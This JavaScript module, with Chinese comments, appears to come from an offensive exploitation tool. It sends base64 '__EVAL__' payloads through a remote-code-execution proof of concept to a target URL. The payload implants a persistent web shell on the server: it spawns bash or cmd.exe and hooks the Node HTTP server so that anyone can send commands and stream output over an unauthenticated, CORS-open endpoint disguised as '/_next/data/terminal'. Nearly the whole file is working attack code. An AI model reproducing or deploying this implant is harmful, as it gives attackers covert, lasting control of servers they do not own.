import { executePOC } from './poc-handler.js'
import { loadSettings } from './storage-handler.js'

/**
 * 生成基于 HTTP 的终端后端代码
 * 使用 Server-Sent Events (SSE) 实现实时交互
 * 使用单一默认会话，避免多进程问题
 */
function generateHttpTerminalBackend(apiPath = '/_next/data/terminal') {
  const backendCode = `(async()=>{const h=await import('node:http');const u=await import('node:url');const cp=await import('node:child_process');const sessions=new Map();const DEFAULT_SID='default_terminal_session';const createDefaultSession=()=>{if(sessions.has(DEFAULT_SID)){return DEFAULT_SID;}const isWin=process.platform==='win32';const shell=isWin?'cmd.exe':'/bin/bash';const shellArgs=isWin?['/Q']:['-i'];const spawnOpts={env:Object.assign({},process.env,{TERM:'xterm-256color',COLORTERM:'truecolor',PYTHONUNBUFFERED:'1'}),cwd:process.cwd()};if(isWin){spawnOpts.windowsHide=true;spawnOpts.detached=false;}const pty=cp.spawn(shell,shellArgs,spawnOpts);if(isWin){pty.stdin.setDefaultEncoding('utf8');pty.stdout.setEncoding('utf8');}const sess={pty:pty,clients:[],isWin:isWin};sessions.set(DEFAULT_SID,sess);if(isWin){setTimeout(()=>{pty.stdin.write('chcp 65001>nul && echo [READY]\\r\\n');},100);}pty.stdout.on('data',(d)=>{sess.clients.forEach(c=>{try{const b64=d.toString('base64');c.write('data: '+JSON.stringify({type:'stdout',data:b64})+'\\n\\n');}catch(err){}});});pty.stderr.on('data',(d)=>{sess.clients.forEach(c=>{try{const b64=d.toString('base64');c.write('data: '+JSON.stringify({type:'stderr',data:b64})+'\\n\\n');}catch(err){}});});pty.on('exit',(code)=>{sess.clients.forEach(c=>{try{c.write('data: '+JSON.stringify({type:'exit',code:code||0})+'\\n\\n');c.end();}catch(err){}});sessions.delete(DEFAULT_SID);});return DEFAULT_SID;};createDefaultSession();const o=h.Server.prototype.emit;h.Server.prototype.emit=function(e,...a){if(e==='request'){const[q,s]=a;const p=u.parse(q.url,true);if(p.pathname==='${apiPath}'){const action=p.query.action;const sid=p.query.sid||DEFAULT_SID;const cors={'Access-Control-Allow-Origin':'*','Access-Control-Allow-Methods':'GET,POST,OPTIONS','Access-Control-Allow-Headers':'Content-Type'};if(q.method==='OPTIONS'){s.writeHead(200,cors);s.end();return true;}if(action==='create'){const sessionId=createDefaultSession();s.writeHead(200,Object.assign({'Content-Type':'application/json'},cors));s.end(JSON.stringify({success:true,sessionId:sessionId,platform:process.platform}));return true;}if(action==='stream'){const sess=sessions.get(sid);if(!sess){const newSid=createDefaultSession();const newSess=sessions.get(newSid);if(!newSess){s.writeHead(500,Object.assign({'Content-Type':'application/json'},cors));s.end(JSON.stringify({success:false,error:'Failed to create session'}));return true;}s.writeHead(200,Object.assign({'Content-Type':'text/event-stream','Cache-Control':'no-cache','Connection':'keep-alive'},cors));s.write('data: '+JSON.stringify({type:'connected'})+'\\n\\n');newSess.clients.push(s);q.on('close',()=>{const idx=newSess.clients.indexOf(s);if(idx>-1)newSess.clients.splice(idx,1);});return true;}s.writeHead(200,Object.assign({'Content-Type':'text/event-stream','Cache-Control':'no-cache','Connection':'keep-alive'},cors));s.write('data: '+JSON.stringify({type:'connected'})+'\\n\\n');sess.clients.push(s);q.on('close',()=>{const idx=sess.clients.indexOf(s);if(idx>-1)sess.clients.splice(idx,1);});return true;}if(action==='input'){let body='';q.on('data',c=>body+=c.toString('utf8'));q.on('end',()=>{try{const data=JSON.parse(body);const sess=sessions.get(sid);if(sess&&sess.pty&&sess.pty.stdin){const input=data.input;sess.pty.stdin.write(input);s.writeHead(200,Object.assign({'Content-Type':'application/json'},cors));s.end(JSON.stringify({success:true}));}else{s.writeHead(404,Object.assign({'Content-Type':'application/json'},cors));s.end(JSON.stringify({success:false,error:'Session not found'}));}}catch(err){s.writeHead(500,Object.assign({'Content-Type':'application/json'},cors));s.end(JSON.stringify({success:false,error:err.message}));}});return true;}if(action==='close'){s.writeHead(200,Object.assign({'Content-Type':'application/json'},cors));s.end(JSON.stringify({success:true,message:'Default session cannot be closed'}));return true;}s.writeHead(400,Object.assign({'Content-Type':'application/json'},cors));s.end(JSON.stringify({success:false,error:'Invalid action'}));return true;}}return o.apply(this,arguments);};global.__httpTerminalInjected=true;global.__httpTerminalPath='${apiPath}';})();`

  return backendCode
}

/**
 * 通过 POC 注入 HTTP 终端后端
 */
export async function injectHttpTerminalBackend(targetUrl, apiPath = '/_next/data/terminal') {
  try {
    // 首先检查是否已经注入过
    console.log('检查 HTTP 终端后端是否已注入...')
    const checkCommand = `__EVAL__:${Buffer.from(
      `
      try {
        JSON.stringify({
          injected: global.__httpTerminalInjected === true,
          path: global.__httpTerminalPath
        });
      } catch(e) {
        JSON.stringify({ injected: false, error: e.message });
      }
    `
    ).toString('base64')}`

    // 加载设置
    const settingsResult = await loadSettings()
    const settings = settingsResult.success ? settingsResult.settings : null

    const checkResult = await executePOC(targetUrl, checkCommand, settings)
    const checkData = checkResult.digest_content

    // 解析检查结果
    let alreadyInjected = false
    try {
      if (checkData) {
        const parsed = JSON.parse(checkData)
        if (parsed.injected && parsed.path === apiPath) {
          alreadyInjected = true
          console.log('✓ HTTP 终端后端已存在，跳过注入')
        }
      }
    } catch {
      // 解析失败，继续注入
    }

    // 如果已经注入过，直接返回成功
    if (alreadyInjected) {
      return {
        success: true,
        apiPath,
        message: 'HTTP 终端后端已存在',
        alreadyInjected: true
      }
    }

    // 否则执行注入
    const backendCode = generateHttpTerminalBackend(apiPath)
    const base64Code = Buffer.from(backendCode).toString('base64')
    const command = `__EVAL__:${base64Code}`

    console.log('注入 HTTP 终端后端...')
    console.log('API 路径:', apiPath)

    const result = await executePOC(targetUrl, command, settings)

    console.log('注入结果:', {
      is_vulnerable: result.is_vulnerable,
      status_code: result.status_code
    })

    if (result.is_vulnerable) {
      await new Promise((resolve) => setTimeout(resolve, 500))

      return {
        success: true,
        apiPath,
        message: 'HTTP 终端后端注入成功',
        alreadyInjected: false
      }
    } else {
      return {
        success: false,
        error: '注入失败'
      }
    }
  } catch (error) {
    console.error('注入失败:', error)
    return {
      success: false,
      error: error.message
    }
  }
}
